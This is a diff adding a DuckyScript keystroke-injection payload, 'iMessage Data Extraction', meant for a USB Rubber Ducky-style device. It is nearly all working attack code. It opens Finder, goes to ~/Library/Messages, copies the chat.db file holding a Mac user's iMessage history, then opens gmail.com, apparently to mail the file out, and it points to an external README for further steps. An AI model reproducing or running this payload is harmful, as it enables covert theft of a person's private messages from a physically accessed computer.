@@ -1,0 +1,35 @@
+REM Title: iMessage Data Extraction
+REM Description: Recon payload that locates and exfils the chat.db file located in MACOSX Library
+REM AUTHOR: Skye Jacobson
+REM Version: 1.0
+REM Category: Reconnaissance
+REM Target: MACOSX and later versions
+
+REM Description: Visit https://github.com/skyejacobson for usage and other important instructions. Look for the README.md file.
+
+DELAY 300
+ENTER
+DELAY 200
+GUI SPACE
+DELAY 200
+STRING Finder
+ENTER
+DELAY 500
+SHIFT GUI G
+DELAY 300
+STRING ~/Library/Messages
+DELAY 100
+ENTER
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+GUI c
+DELAY 50
+GUI SPACE
+DELAY 200
+STRING gmail.com
+DELAY 1000
+ENTER
+DELAY 2000
